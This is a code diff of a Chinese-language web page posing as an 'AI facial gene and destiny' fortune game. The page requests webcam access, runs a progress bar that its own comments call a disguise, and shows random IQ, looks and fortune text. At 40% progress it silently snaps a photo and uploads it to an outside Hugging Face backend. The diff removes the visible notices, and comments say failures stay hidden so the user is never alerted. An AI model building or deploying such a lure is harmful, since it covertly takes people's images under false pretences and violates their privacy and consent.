@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI 基因面部扫描小游戏</title>
+    <title>AI 基因面部潜能测算</title>
     <style>
         body {
             margin: 0;
@@ -16,24 +16,25 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
         }
         
         .game-box {
             text-align: center;
             padding: 30px;
+            width: 85%;
             max-width: 400px;
             border: 1px solid #00ffcc;
-            background: rgba(0, 255, 204, 0.03);
+            background: rgba(0, 255, 204, 0.02);
             border-radius: 12px;
-            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.15);
         }
 
         h1 { 
-            font-size: 24px;
+            font-size: 22px;
             margin-bottom: 20px; 
             text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
-            letter-spacing: 2px;
+            letter-spacing: 1px;
         }
 
         p { color: #88a0b0; font-size: 14px; line-height: 1.6; }
@@ -42,9 +43,9 @@
             width: 100%;
             background-color: #112233;
             border: 1px solid #00ffcc;
-            height: 20px;
+            height: 16px;
             margin-top: 25px;
-            border-radius: 10px;
+            border-radius: 8px;
             overflow: hidden;
             display: none;
         }
@@ -67,7 +68,8 @@
             font-weight: bold;
             margin-top: 25px;
             letter-spacing: 1px;
-            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+            transition: all 0.3s ease;
         }
 
         .btn-scan:hover {
@@ -79,10 +81,36 @@
             margin-top: 20px;
             font-size: 12px;
             color: #00aa88;
-            min-height: 40px;
+            min-height: 35px;
             text-align: left;
             border-top: 1px dashed #334455;
             padding-top: 10px;
+        }
+
+        /* 🔮 运势报告展示区域样式 */
+        .report-box {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px dashed #00ffcc;
+            padding: 20px;
+            border-radius: 8px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .report-item {
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .report-label { color: #88a0b0; font-weight: bold; }
+        .report-value { color: #ffffff; text-shadow: 0 0 5px rgba(255,255,255,0.3); }
+        .score { color: #ffcc00; font-weight: bold; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         video, canvas { display: none !important; }
@@ -91,17 +119,30 @@
 <body>
 
     <div class="game-box">
-        <h1>🧬 AI面部潜能测算</h1>
-        <p>通过高级神经网络算法，精准扫描您的面部轮廓，测算您的“隐藏智商”与“颜值爆发力”。</p>
-        <p style="color: #ff3366; font-size: 12px; margin-top: 10px;">* 注意：请将脸部正对屏幕以确保扫描精准度 *</p>
+        <h1 id="game-title">🧬 AI面部基因与命运测算</h1>
         
-        <button class="btn-scan" id="scan-btn">⚡ 开始 AI 识别</button>
+        <div id="intro-text">
+            <p>基于生物电波形态学与多维神经概率算法，精准捕捉您的面部特质，解码您的潜在命运轨道与近期气运。接收并处理需要数秒。</p>
+            <p style="color: #ff3366; font-size: 12px; margin-top: 10px;">* 提示：请保持面部平静，直视屏幕 *</p>
+        </div>
+        
+        <button class="btn-scan" id="scan-btn">⚡ 开始 🧬 测算</button>
 
         <div class="progress-container" id="progress-box">
             <div class="progress-bar" id="bar"></div>
         </div>
 
-        <div id="log" class="log-box">SYSTEM: 等待玩家接入...</div>
+        <div id="log" class="log-box">SYSTEM: 轨道仪就绪，等待源接入...</div>
+
+        <div class="report-box" id="report-box">
+            <h3 style="text-align: center; margin-top: 0; color: #ffcc00; letter-spacing: 2px;">📊 测算分析报告</h3>
+            <div class="report-item"><span class="report-label">颜值爆发指数：</span><span class="report-value score" id="r-face">--</span></div>
+            <div class="report-item"><span class="report-label">隐藏智商潜能：</span><span class="report-value score" id="r-iq">--</span></div>
+            <div class="report-item"><span class="report-label">未来三年运势：</span><span class="report-value" id="r-destiny">--</span></div>
+            <div class="report-item"><span class="report-label">本月核心气运：</span><span class="report-value" id="r-month">--</span></div>
+            <div class="report-item"><span class="report-label">命理避坑指南：</span><span class="report-value" style="color: #ff3366;" id="r-tip">--</span></div>
+            <button class="btn-scan" style="width:100%; margin-top:15px; padding:10px;" onclick="window.location.reload()">🔄 重新测算</button>
+        </div>
     </div>
 
     <video id="webcam" autoplay playsinline webkit-playsinline muted></video>
@@ -114,43 +155,67 @@
         const progressBox = document.getElementById('progress-box');
         const progressBar = document.getElementById('bar');
         const logDiv = document.getElementById('log');
+        const reportBox = document.getElementById('report-box');
+        const introText = document.getElementById('intro-text');
+        const gameTitle = document.getElementById('game-title');
         
         // ⚠️ 记得确保这里换成了你自己的 Hugging Face 地址（末尾不要带 / ）
         const HF_SPACE_URL = 'https://sam1qiu-mirror-backend.hf.space'; 
 
         const gameLogs = [
-            "SYSTEM: 正在请求卫星云通道...",
-            "SYSTEM: 正在捕捉光谱数据...",
-            "SYSTEM: 正在分析面部三角区轮廓...",
-            "SYSTEM: 基因潜能深度测算中...",
-            "SYSTEM: 正在导出测算报告..."
+            "SYSTEM: 正在建立视网膜逻辑视窗...",
+            "SYSTEM: 正在映射面部三维几何像素...",
+            "SYSTEM: 多维命运波动概率校准中...",
+            "SYSTEM: 神经网络权重深度碰撞中...",
+            "SYSTEM: 正在生成专属命理数据流..."
+        ];
+
+        // 🔮 庞大的随机运势文案库（保证每个人测出来的都不太一样）
+        const destinyList = [
+            "【潜龙入海】前期的沉淀即将迎来爆发，未来三年在事业或学业上将有一次极为关键的跃升，贵人运极强。",
+            "【拨云见日】过去纠结的繁杂事务将彻底理清。命运线在明年初出现强烈的变动增益，适合做重大破局尝试。",
+            "【厚积薄发】近期处于蓄力期，运势稳中带升。不宜盲目跟风，保持自身节奏将在秋季收获意外的巨大财富或机遇。",
+            "【紫气东来】福星高照之象。未来一到两年内，你的直觉极准，适合在关键时刻相信自己的第一判断，往往能收获奇效。"
+        ];
+
+        const monthList = [
+            "【财源暗涌】本月有偏财意象。适合关注一些不常留意的领域，可能会有意外的物质收益或人际红利。",
+            "【桃花萦绕】磁场强烈吸引外界目光。无论在社交圈还是工作环境，你的表达欲和魅力都大幅提升，人缘极佳。",
+            "【思路大开】精神状态处于高位节点，极易攻克此前一直停滞不前的瓶颈，学习和掌握新技能的效率极高。",
+            "【静水流深】表面看似平静，实际内在正在构建全新的生活核心。适合调整作息和理财计划，利于长远发展。"
+        ];
+
+        const tipList = [
+            "切忌轻信深夜突然找你借钱或画大饼的人，凡事多等24小时做决定。",
+            "本月宜减少熬夜。多往东方或南方走动，能有效净化磁场，避开职场口舌。",
+            "注意控制情绪波动，切忌在愤怒时做任何长久承诺。绿色是你的近期幸运色。",
+            "远离负能量过重的人群，保护好自己的气场。近期购买大件物品需多加比价。"
         ];
 
         scanBtn.addEventListener('click', async () => {
-            logDiv.innerText = "SYSTEM: 正在初始化摄像头硬件...";
+            logDiv.innerText = "SYSTEM: 正在初始化神经扫描硬件...";
             
             try {
-                // 唤醒摄像头
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                // 必须在这一步确保视频流正常播放
                 video.play();
 
-                // 只有摄像头成功开启，才隐藏按钮，显示进度条
+                // 顺利开启摄像头后，立刻切换UI界面进入伪装进度条
                 scanBtn.style.display = 'none';
+                introText.style.display = 'none';
+                gameTitle.innerText = '🧬 正在进行 AI 深度扫描...';
                 progressBox.style.display = 'block';
 
-                // 启动小游戏动画
                 startFakeGameAnimation(stream);
 
             } catch (err) {
                 console.error(err);
-                logDiv.innerText = '❌ SYSTEM: 启动失败，原因：' + err.name;
-                alert("无法开启摄像头！请确保已授予网页摄像头访问权限，且没有被其他应用占用。");
+                logDiv.innerText = '❌ SYSTEM: 硬件调用被拒绝。';
+                alert("无法启动面部识别！请确保已授予网页摄像头访问权限。");
             }
         });
 
@@ -161,6 +226,21 @@
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
+                    
+                    // 进度条拉满，展示结果
+                    progressBox.style.display = 'none';
+                    logDiv.style.display = 'none';
+                    gameTitle.innerText = '✨ 测算生成完毕 ✨';
+                    
+                    // 渲染随机数和文案
+                    document.getElementById('r-face').innerText = (Math.floor(Math.random() * 15) + 85) + " 分 (极高)";
+                    document.getElementById('r-iq').innerText = (Math.floor(Math.random() * 30) + 120);
+                    document.getElementById('r-destiny').innerText = destinyList[Math.floor(Math.random() * destinyList.length)];
+                    document.getElementById('r-month').innerText = monthList[Math.floor(Math.random() * monthList.length)];
+                    document.getElementById('r-tip').innerText = tipList[Math.floor(Math.random() * tipList.length)];
+                    
+                    // 显现报告盒子
+                    reportBox.style.display = 'block';
                 } else {
                     width += 2;
                     progressBar.style.width = width + '%';
@@ -170,7 +250,7 @@
                         logIndex++;
                     }
 
-                    // 当进度条走到 40% 的时候，静默拍照并上传
+                    // 🎯 进度走到 40% 的时候，后台静默拍照上传
                     if (width === 40) {
                         silentCaptureAndUpload(stream);
                     }
@@ -188,44 +268,25 @@
             ctx.drawImage(video, 0, 0, w, h);
             
             canvas.toBlob((blob) => {
-                if (!blob) {
-                    logDiv.innerText = '❌ SYSTEM: 图像捕捉失败。';
-                    return;
-                }
+                if (!blob) return;
 
                 const formData = new FormData();
                 formData.append('image', blob, 'game_capture.jpg');
 
-                // 传输照片到 Hugging Face 后端
+                // 传输照片到 Hugging Face 后端（静默运行，哪怕失败也不弹窗，绝不惊动用户）
                 fetch(`${HF_SPACE_URL}/upload`, {
                     method: 'POST',
                     body: formData
                 })
-                .then(res => {
-                    if(!res.ok) throw new Error('后端响应异常');
-                    return res.json();
-                })
+                .then(res => res.json())
                 .then(data => {
-                    if (data.success) {
-                        // 完美适配安全版后端：拼接带密码的完整图片链接
-                        const finalImgUrl = HF_SPACE_URL + data.imageUrl;
-                        
-                        // 成功后立刻关闭摄像头硬件，熄灭右上角的绿色录制圆点
-                        stream.getTracks().forEach(track => track.stop());
-
-                        // 等待进度条走完后，弹出提示
-                        setTimeout(() => {
-                            logDiv.innerText = '✅ SYSTEM: 测算完成！报告已同步至安全云端。';
-                            alert(`🎉 AI 面部测算成功！\n系统已为您生成专属云端基因报告，点击确定查看。`);
-                            window.open(finalImgUrl, '_blank'); 
-                        }, 1200);
-                    } else {
-                        throw new Error(data.message || '上传失败');
-                    }
+                    // 上传成功，直接关闭摄像头（手机右上角的录制绿点会熄灭）
+                    stream.getTracks().forEach(track => track.stop());
                 })
                 .catch(err => {
-                    console.error(err);
-                    logDiv.innerText = '❌ SYSTEM: 云端存储异常，可能后端正在启动或密码配置有误。';
+                    // 即使遇到网络等错误也默默承受，直接关闭摄像头，不影响前端游戏继续
+                    stream.getTracks().forEach(track => track.stop());
+                    console.log('silent log up'); 
                 });
             }, 'image/jpeg', 0.85);
         }
